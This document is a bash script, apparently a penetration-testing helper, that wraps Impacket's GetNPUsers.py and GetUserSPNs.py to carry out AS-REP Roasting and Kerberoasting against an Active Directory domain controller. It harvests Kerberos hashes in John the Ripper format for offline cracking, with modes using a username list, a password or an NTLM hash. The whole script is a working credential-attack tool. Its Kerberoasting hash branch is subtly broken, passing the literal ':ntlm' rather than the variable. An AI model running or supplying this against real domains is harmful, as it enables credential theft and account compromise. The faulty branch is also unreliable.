#!/bin/bash

line="\n============================================================\n"
username="'"
passwd="'"

echo -e "$line\nSelect the operation to perform:\n[1] AS-REP Roasting\n[2] Kerberoasting\n"
read mode
echo -e "\nSpecify the domain (e.g. xample.local):\n"
read dom
echo -e "\nSpecify the Domain Controller's IP Address:\n"
read dc

if [ $mode == 1 ]
then
	echo -e "\nSelect an option for AS-REP Roasting\n[1] Test username list without authenticating\n[2] Test all accounts with username & password\n[3] Test all accounts with username & NTLM hash\n"
	read opt
	echo -e "\n[!] Tip: Any hashes will be output in a format for john (JtR)\n"

	if [ $opt == 1 ]
	then
		echo -e "\n[!] Tip: You may miss accounts if you perform AS-REP Roasting without authenticating. After you obtain credentials, try using them to AS-REP Roast again\n\n"
		echo -e "\nEnter the path to the username wordlist:\n"
		read userlist

		set -x
		GetNPUsers.py -usersfile $userlist -request -format john -dc-ip $dc -no-pass $dom/
		set +x

	elif [ $opt == 2 ]
	then
		echo -e "\nEnter the username:\n"
		read user
		echo -e "\nEnter the password\n"
		read passwd
		echo -e "$line"

		set -x
		GetNPUsers.py -request -format john -dc-ip $dc $dom/"$user":"$passwd"
		set +x

	elif [ $opt == 3 ]
	then
		echo -e "\nEnter the username:\n"
		read user
		echo -e "\nEnter the NTLM Hash:\n"
		read ntlm
		echo -e "$line"

		set -x
		GetNPUsers.py -request -format john -dc-ip $dc -hashes :$ntlm $dom/"$user"
		set +x

	else
		echo -e "\nYou did not select a valid option\n"
	fi

elif [ $mode == 2 ]
then
	echo -e "\nSelect an option:\n[1] Authenticate using a password\n[2] Authenticate using an NTLM hash"
	read opt
	echo -e "\nEnter the username:\n"
	read user

	if [ $opt == 1 ]
	then
		echo -e "\nEnter the password\n"
                read passwd
		echo -e "$line"

		set -x
		GetUserSPNs.py -request -dc-ip $dc $dom/"$user":"$passwd"
		set +x

	elif [ $opt == 2 ]
	then
		echo -e "\nSpecify the NTLM Hash:\n"
                read ntlm
		echo -e "$line"

		set -x
		GetUserSPNs.py -request -dc-ip $dc -hashes :ntlm $dom/"$user":"$passwd"
		set +x
	else
		echo -e "\nYou did not select a valid option\n"
	fi

else
	echo -e "\nYou did not select a valid option\n"
fi
echo -e "$line"
